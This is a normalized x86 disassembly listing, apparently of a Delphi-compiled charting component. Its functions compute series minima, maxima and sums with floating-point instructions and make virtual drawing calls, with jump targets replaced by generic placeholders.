mov eax [ ebx + 0x14 ]
mov [ esp + 0x4 ] eax
fld [ esp ]
pop ecx
pop edx
pop ebx
retn
mov eax ebx
call sub_47f4c0
sub_47f448
push ebx
add esp 0xfffffff8
mov ebx eax
cmp [ ebx + 0x54 ] 0x0
je r-xdata
mov eax [ ebx + 0x18 ]
mov [ esp ] eax
mov eax [ ebx + 0x1c ]
mov [ esp + 0x4 ] eax
fld [ esp ]
pop ecx
pop edx
pop ebx
retn
mov eax ebx
call sub_47f4c0
sub_47f470
push ebx
add esp 0xfffffff8
mov ebx eax
cmp [ ebx + 0x54 ] 0x0
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ esp ] eax
mov eax [ ebx + 0x44 ]
mov [ esp + 0x4 ] eax
fld [ esp ]
pop ecx
pop edx
pop ebx
retn
mov eax ebx
call sub_47f4c0
sub_47f498
push ebx
add esp 0xfffffff8
mov ebx eax
cmp [ ebx + 0x54 ] 0x0
je r-xdata
mov eax [ ebx + 0x48 ]
mov [ esp ] eax
mov eax [ ebx + 0x4c ]
mov [ esp + 0x4 ] eax
fld [ esp ]
pop ecx
pop edx
pop ebx
retn
mov eax ebx
call sub_47f4c0
sub_47f4c0
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
jle r-xdata
xor eax eax
mov [ ebx + 0x18 ] eax
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x10 ] eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x40 ] eax
mov [ ebx + 0x44 ] eax
xor eax eax
mov [ ebx + 0x48 ] eax
mov [ ebx + 0x4c ] eax
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc ]
fstp [ esp ]
fwait
mov eax [ esp ]
mov [ ebx + 0x18 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x1c ] eax
mov eax [ esp ]
mov [ ebx + 0x10 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x14 ] eax
mov eax [ esp ]
mov [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x44 ] eax
fld [ esp ]
fabs
fstp [ ebx + 0x48 ]
fwait
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
mov esi eax
dec esi
test esi esi
jle r-xdata
mov [ ebx + 0x54 ] 0x0
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov edi 0x1
fld [ esp ]
fcomp [ ebx + 0x10 ]
fnstsw ax
sahf
jbe r-xdata
mov eax [ esp ]
mov [ ebx + 0x18 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x1c ] eax
jmp r-xdata
fld [ ebx + 0x40 ]
fadd [ esp ]
fstp [ ebx + 0x40 ]
fwait
fld [ esp ]
fabs
fadd [ ebx + 0x48 ]
fstp [ ebx + 0x48 ]
fwait
inc edi
dec esi
jne r-xdata
mov eax [ esp ]
mov [ ebx + 0x10 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x14 ] eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc ]
fstp [ esp ]
fwait
fld [ esp ]
fcomp [ ebx + 0x18 ]
fnstsw ax
sahf
jae r-xdata
jmp r-xdata
sub_47f5c0
push ebx
push esi
push edi
mov esi eax
mov eax [ esi + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ esi + 0x8 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov edx [ rw-data ]
mov eax [ esi + 0x8 ]
call sub_414520
mov [ esi + 0x54 ] 0x1
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov edx edi
mov eax [ esi + 0x8 ]
call sub_4143bc
mov edx 0x8
call sub_402714
inc edi
dec ebx
jne r-xdata
sub_47f60c
push ebx
push esi
push edi
push ebp
mov ebx [ eax + 0x8 ]
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_4143bc
mov ebp eax
mov edi [ ebx + 0x8 ]
dec edi
test edi edi
jle r-xdata
mov edx [ ebx + 0x8 ]
dec edx
mov ecx ebp
mov eax ebx
call sub_4144b0
mov esi 0x1
mov edx esi
mov eax ebx
call sub_4143bc
mov ecx eax
mov edx esi
dec edx
mov eax ebx
call sub_4144b0
inc esi
dec edi
jne r-xdata
sub_47f65c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x50 ]
mov edx esi
call sub_4044a0
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x50 ]
mov edx esi
call sub_4040e8
mov eax [ ebx + 0x30 ]
call sub_480ca0
sub_47f684
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi esi
mov al [ edi + 0x2c ]
mov [ ebx + 0x2c ] al
mov al [ edi + 0x4 ]
mov [ ebx + 0x4 ] al
mov eax [ edi + 0x20 ]
mov [ ebx + 0x20 ] eax
mov eax [ edi + 0x24 ]
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0x50 ]
mov edx [ edi + 0x50 ]
call sub_4040e8
sub_47f6c8
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x8 ]
jge r-xdata
xor eax eax
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_4143bc
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_4143bc
pop esi
pop ebx
retn
sub_47f6f4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403314
mov [ edi + 0x20 ] esi
mov [ edi + 0x1c ] 0x2
mov eax [ edi + 0x20 ]
call sub_480c88
mov [ edi + 0x14 ] eax
mov [ edi + 0xc ] 0x80ffff
mov eax [ edi + 0x20 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x144 ]
push eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_472c1c
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] 0x8
mov eax [ edi + 0x20 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x144 ]
push eax
call sub_47745c
mov [ edi + 0x18 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ edi + 0x24 ] eax
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_47f790
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_4149b4
mov edi esi
mov edx [ edi + 0x4 ]
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ edi + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ edi + 0xc ]
mov [ ebx + 0xc ] eax
mov al [ edi + 0x10 ]
mov [ ebx + 0x10 ] al
mov al [ edi + 0x11 ]
mov [ ebx + 0x11 ] al
mov edx [ edi + 0x14 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx [ edi + 0x18 ]
mov eax [ ebx + 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov al [ edi + 0x1c ]
mov [ ebx + 0x1c ] al
mov al [ edi + 0x28 ]
mov [ ebx + 0x28 ] al
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_47f868
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx [ eax + 0x24 ]
jmp r-xdata
cmp esi [ ebx + 0x8 ]
jge r-xdata
xor edx edx
mov eax ebx
call sub_414210
mov edx esi
mov eax ebx
call sub_4143bc
test eax eax
jne r-xdata
mov edx esi
mov eax ebx
call sub_47f6c8
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ eax + 0x14 ] 0x0
mov ecx eax
mov edx esi
mov eax ebx
call sub_4144b0
mov edx [ edi ]
call sub_47f120
mov edx [ edi ]
xchg edx eax
call sub_47f120
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_47f8d0
push ebx
push esi
push edi
mov edi [ eax + 0x24 ]
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x8 ]
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_47f6c8
call sub_403344
inc esi
dec ebx
jne r-xdata
sub_47f900
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax [ esi + 0x18 ]
call sub_403344
mov eax [ esi + 0x14 ]
call sub_403344
mov eax [ esi + 0x4 ]
call sub_403344
mov eax esi
call sub_47f8d0
mov eax [ esi + 0x24 ]
call sub_403344
mov edx ebx
and dl 0xfc
mov eax esi
call sub_414988
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_47f980
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
mov eax [ eax + 0x68 ]
mov ebx [ eax + 0x288 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x9c ]
test al al
je r-xdata
push esi
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x5c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2c ]
push eax
push esi
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x124 ]
jmp r-xdata
pop esi
pop ebx
pop ebp
retn
sub_47f9e8
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
xor eax eax
push ebp
push sub_47fb0c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax + 0x1c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
mov edx [ edx + 0x24 ]
sar edx 0x1
jns r-xdata
add eax edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov edx [ rw-data ]
mov dl [ edx ]
call sub_40427c
mov eax [ ebp - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0xc ]
call sub_40c998
mov ebx eax
test ebx ebx
jle r-xdata
adc edx 0x0
push ebp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
call sub_47f980
pop ecx
lea eax [ ebp - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0xc ]
call sub_40412c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
mov eax [ eax + 0x68 ]
mov eax [ eax + 0x288 ]
call sub_472f94
mov esi eax
push ebp
lea eax [ ebp - 0x14 ]
push eax
mov ecx ebx
dec ecx
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_4045b4
mov eax [ ebp - 0x14 ]
call sub_47f980
pop ecx
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebx + 0x1 ]
mov ecx 0xff
mov eax [ ebp - 0xc ]
call sub_4045b4
add [ ebp - 0x8 ] esi
lea eax [ ebp - 0x18 ]
mov edx [ rw-data ]
mov dl [ edx ]
call sub_40427c
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
call sub_40c998
mov ebx eax
test ebx ebx
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47fb13
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_4040b8
retn
push ebp
mov eax [ ebp - 0xc ]
call sub_47f980
pop ecx
jmp r-xdata
sub_47fb1c
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
lea ecx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_47f868
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x20 ]
mov eax [ esi + 0x68 ]
mov ebx [ eax + 0x288 ]
mov al [ eax + 0x278 ]
mov [ ebp - 0x15 ] al
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x21 ] 0x0
je r-xdata
cmp [ ebp - 0x15 ] 0x0
je r-xdata
mov edx eax
mov eax [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax [ ebx + 0x10 ]
call sub_41dae4
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x21 ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x9c ]
test al al
jne r-xdata
cmp [ ebp - 0x15 ] 0x0
je r-xdata
mov eax [ ebx + 0xc ]
call sub_41d6b8
cmp eax [ ebp - 0x8 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebx + 0x10 ]
call sub_41d9c8
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x10 ]
mov dl [ eax + rw-data ]
mov eax [ ebx + 0x10 ]
call sub_41dae4
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_472e8c
cmp [ ebp - 0x15 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov esi [ eax + 0xc ]
mov eax [ ebp + 0x8 ]
sub esi [ eax + 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x10 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx + 0x20 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0xc ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0xa4 ]
lea ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
sub edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
sub eax esi
call sub_412edc
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x20 ]
mov [ eax + 0x1c ] edx
mov edx [ ebp - 0x1c ]
mov [ eax + 0x20 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x4 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x84 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x4 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0xe8 ]
jmp r-xdata
mov eax [ esi + 0x68 ]
cmp [ eax + 0x70 ] 0x0
sete al
and eax 0x7f
mov edx [ eax * 4 + rw-data ]
mov eax [ ebx + 0xc ]
call sub_41d6c0
mov eax [ ebx + 0xc ]
call sub_41d6b8
mov edx [ esi + 0x68 ]
cmp eax [ edx + 0x70 ]
jne r-xdata
lea edx [ ebp - 0x30 ]
mov eax [ ebp + 0x8 ]
call sub_47f154
lea edx [ ebp - 0x30 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x9c ]
test al al
je r-xdata
mov dl 0x1
mov eax [ ebx + 0x10 ]
call sub_41dae4
mov edx 0x6
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x28 ]
push ebp
call sub_47f9e8
pop ecx
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x28 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax esi
call sub_41d7e4
mov edx [ ebp + 0x8 ]
add [ edx + 0x20 ] eax
lea edx [ ebp - 0x30 ]
mov eax [ ebp + 0x8 ]
call sub_47f154
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x2c ]
inc ecx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10c ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x14 ]
cmp [ esi + 0x21 ] 0x0
je r-xdata
sub_47fd58
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_419db0
mov [ esi + 0x41 ] 0x1
mov [ esi + 0x39 ] 0x1
mov [ esi + 0x38 ] 0x0
xor eax eax
mov [ esi + 0x30 ] eax
mov [ esi + 0x34 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_47fdd4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47fe3c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x3c ]
mov edx [ eax ]
call [ edx + 0x104 ]
mov edx [ eax + 0x50 ]
lea eax [ ebp - 0x4 ]
call sub_40412c
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xf0 ]
mov ebx eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x104 ]
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47fe43
lea eax [ ebp - 0x4 ]
call sub_404094
retn
sub_47fe4c
push ebx
push esi
push edi
push ebp
add esp 0xffffffd8
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebx + 0x3c ]
mov [ esp + 0x10 ] eax
push 0xffffffff
or ecx 0xffffffff
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x3c ]
fstp [ esp + 0x8 ]
fwait
mov eax [ esp + 0x10 ]
cmp [ eax + 0xfa ] 0x0
jne r-xdata
mov eax esi
call sub_480b24
test al al
jne r-xdata
mov eax edi
call sub_47f448
fstp [ esp ]
fwait
push [ esp + 0x4 ]
push [ esp + 0x4 ]
push [ esp + 0x14 ]
push [ esp + 0x14 ]
mov eax esi
call sub_480b24
mov edx eax
mov eax ebx
call sub_480204
mov eax edi
call sub_47f420
fstp [ esp ]
fwait
push [ esp + 0x4 ]
push [ esp + 0x4 ]
push [ esp + 0x14 ]
push [ esp + 0x14 ]
mov eax esi
call sub_480b24
mov edx eax
mov eax ebx
call sub_480204
jmp r-xdata
mov eax edi
call sub_47f420
fstp [ esp + 0x14 ]
fwait
mov eax edi
call sub_47f448
fsubr [ esp + 0x14 ]
fmul [ r-xdata ]
fstp [ esp + 0x1c ]
fwait
mov eax edi
call sub_47f448
fld [ esp + 0x1c ]
faddp st1
fstp [ esp ]
fwait
mov eax [ ebx + 0x3c ]
call sub_480b24
test al al
je r-xdata
mov eax [ ebx + 0x3c ]
call sub_480b24
test al al
je r-xdata
add esp 0x28
pop ebp
pop edi
pop esi
pop ebx
retn
push [ esp + 0xc ]
push [ esp + 0xc ]
push [ esp + 0xc ]
push [ esp + 0xc ]
mov ecx 0x20000000
xor edx edx
mov eax [ esp + 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x90 ]
push [ esp + 0x4 ]
push [ esp + 0x4 ]
push [ esp + 0x14 ]
push [ esp + 0x14 ]
mov eax esi
call sub_480b24
mov edx eax
mov eax ebx
call sub_480204
jmp r-xdata
mov eax edi
call sub_47f420
fstp [ esp + 0x14 ]
fwait
mov eax edi
call sub_47f448
fsubr [ esp + 0x14 ]
fmul [ r-xdata ]
fstp [ esp + 0x1c ]
fwait
mov eax edi
call sub_47f448
fld [ esp + 0x1c ]
faddp st1
fstp [ esp ]
fwait
push [ esp + 0x4 ]
push [ esp + 0x4 ]
push [ esp + 0x14 ]
push [ esp + 0x14 ]
mov ecx 0x20000000
xor edx edx
mov eax [ esp + 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x90 ]
jmp r-xdata
sub_47ffe0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0x3c ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax esi
call sub_480b24
mov edx eax
mov eax ebx
call sub_480204
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_480024
push ebx
push esi
push edi
push ebp
add esp 0xffffffc8
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov esi eax
mov eax [ esi + 0x3c ]
mov [ esp + 0x34 ] eax
xor eax eax
mov [ esp + 0x10 ] eax
mov eax [ esp ]
call sub_481f8c
mov edi eax
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
fstp [ esp + 0x18 ]
fwait
push [ esi + 0x34 ]
push [ esi + 0x30 ]
call sub_47726c
mov [ esp + 0x30 ] al
mov ebx [ esp + 0x10 ]
mov eax [ esp + 0x18 ]
mov [ esp + 0x20 ] eax
mov eax [ esp + 0x1c ]
mov [ esp + 0x24 ] eax
push [ esi + 0x34 ]
push [ esi + 0x30 ]
mov al [ esp + 0x38 ]
push eax
lea ecx [ esp + 0x24 ]
mov eax [ esp + 0x40 ]
mov eax [ eax + 0x50 ]
mov dl 0x1
call sub_47b348
fld [ r-xdata ]
fmul [ esi + 0x30 ]
fsubr [ esp + 0x18 ]
fstp [ esp + 0x28 ]
fwait
jmp r-xdata
fld [ esi + 0x30 ]
call sub_402b00
mov ebx eax
add ebx [ esp + 0x10 ]
dec ebx
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
fstp [ esp + 0x20 ]
fwait
cmp edi ebx
jle r-xdata
mov eax edi
dec eax
cmp ebx eax
jl r-xdata
mov [ esp + 0x31 ] 0x0
cmp edi ebx
jle r-xdata
mov edx ebx
mov eax [ esp + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
fstp [ esp + 0x28 ]
fwait
jmp r-xdata
lea edx [ ebx + 0x1 ]
mov eax [ esp + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
fcomp [ esp + 0x18 ]
fnstsw ax
sahf
jae r-xdata
cmp [ esi + 0x38 ] 0x0
sete al
or al [ esp + 0x31 ]
je r-xdata
mov al [ esi + 0x39 ]
test al al
jne r-xdata
inc ebx
mov eax edi
dec eax
cmp eax [ esp + 0x10 ]
jge r-xdata
inc ebx
mov [ esp + 0x10 ] ebx
cmp al 0x2
jne r-xdata
mov eax [ esp + 0x20 ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x24 ]
mov [ esp + 0xc ] eax
jmp r-xdata
xor eax eax
mov [ esp + 0x28 ] eax
mov [ esp + 0x2c ] eax
cmp [ esi + 0x38 ] 0x0
jne r-xdata
add esp 0x38
pop ebp
pop edi
pop esi
pop ebx
retn
fld [ esp + 0x20 ]
fadd [ esp + 0x28 ]
fmul [ r-xdata ]
fstp [ esp + 0x8 ]
fwait
mov eax [ esp + 0x28 ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x2c ]
mov [ esp + 0xc ] eax
jmp r-xdata
cmp [ esi + 0x38 ] 0x1
jne r-xdata
cmp [ esi + 0x38 ] 0x0
sete al
or al [ esp + 0x31 ]
je r-xdata
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
fcomp [ esp + 0x18 ]
fnstsw ax
sahf
jae r-xdata
push [ esp + 0xc ]
push [ esp + 0xc ]
push 0x0
push 0x0
mov eax [ esp + 0x10 ]
call sub_480b24
mov edx eax
mov eax esi
call sub_480204
push [ esp + 0xc ]
push [ esp + 0xc ]
push ebx
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0xc ]
mov eax esi
mov ebp [ eax ]
call [ ebp + 0x30 ]
jmp r-xdata
mov [ esp + 0x31 ] 0x1
sub_480204
push ebp
mov ebp esp
push ebx
mov ebx eax
test dl dl
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov ecx 0x20000000
xor edx edx
mov eax [ ebx + 0x3c ]
mov ebx [ eax ]
call [ ebx + 0x90 ]
pop ebx
pop ebp
retn 0x10
lea edx [ ebp + 0x8 ]
lea eax [ ebp + 0x10 ]
call sub_476964
sub_48023c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
fld [ eax + 0x30 ]
call sub_402b00
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x4 ]
dec ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_481f8c
mov esi eax
dec esi
sub esi ebx
jl r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xc ]
add esp 0xfffffff8
fstp [ esp ]
fwait
push ebx
mov ecx ebx
sub ecx [ ebp - 0x4 ]
inc ecx
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax ]
call [ edi + 0x3c ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_480b24
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_480204
inc ebx
dec esi
jne r-xdata
sub_4802c0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_480382
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_481f8c
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_480389
lea eax [ ebp - 0x14 ]
call sub_404094
retn
inc esi
xor ebx ebx
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
push [ ebp - 0xc ]
push [ ebp - 0x10 ]
lea ecx [ ebp - 0x14 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
mov edi [ eax ]
call [ edi + 0x60 ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x3c ]
mov ecx 0x20000000
mov edi [ eax ]
call [ edi + 0x90 ]
inc ebx
dec esi
jne r-xdata
lea edx [ ebp - 0x10 ]
lea eax [ ebp - 0x8 ]
call sub_476964
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xc ]
fstp [ ebp - 0x8 ]
fwait
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x3c ]
mov edx [ eax + 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx ebx
mov edi [ eax ]
call [ edi + 0x40 ]
fstp [ ebp - 0x10 ]
fwait
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xd ] 0x0
jne r-xdata
sub_480390
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x3c ]
mov eax [ ebp - 0x8 ]
call sub_480b24
mov [ ebp - 0xd ] al
cmp [ ebp - 0xd ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8c ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x84 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_481f8c
test eax eax
jle r-xdata
push ebp
